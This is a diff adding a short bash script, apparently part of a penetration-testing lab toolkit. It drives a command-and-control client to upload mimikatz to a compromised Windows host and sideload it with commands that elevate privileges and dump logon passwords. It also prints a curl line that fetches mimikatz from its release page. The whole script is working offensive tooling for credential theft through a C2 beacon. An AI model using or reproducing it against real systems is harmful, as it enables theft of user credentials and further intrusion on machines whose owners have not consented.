@@ -1,0 +1,31 @@
+#!/bin/bash
+# c2-dump - Dump credentials using sideloaded mimikatz
+# Usage: c2-dump <beacon_id> [mimikatz_path]
+C2="$(dirname "$0")/c2"
+BEACON="$1"
+MIKATZ="${2:-/Users/gluppler/Downloads/CTFs-Testing/Pro-Labs/Puppet/mimikatz.exe}"
+
+if [ -z "$BEACON" ]; then
+    echo "Usage: c2-dump <beacon_id> [mimikatz_path]"
+    exit 1
+fi
+
+$C2 use "$BEACON" >/dev/null 2>&1
+
+if [ ! -f "$MIKATZ" ]; then
+    echo "[!] mimikatz not found at $MIKATZ"
+    echo "[*] Uploading from https://github.com/gentilkiwi/mimikatz/releases required"
+    echo "[*] Download to Puppet dir first:"
+    echo "    curl -L -o $(dirname $MIKATZ)/mimikatz.exe https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz.exe"
+    exit 1
+fi
+
+echo "[*] Uploading mimikatz to target..."
+$C2 upload "$MIKATZ" "C:\\programdata\\puppet\\mimikatz.exe"
+sleep 5
+
+echo "[*] Sideloading mimikatz for credential dump..."
+$C2 task "sideload C:\\programdata\\puppet\\mimikatz.exe \"token::elevate privilege::debug sekurlsa::logonpasswords exit\""
+
+echo "[*] Waiting 120s for dump..."
+$C2 wait 120
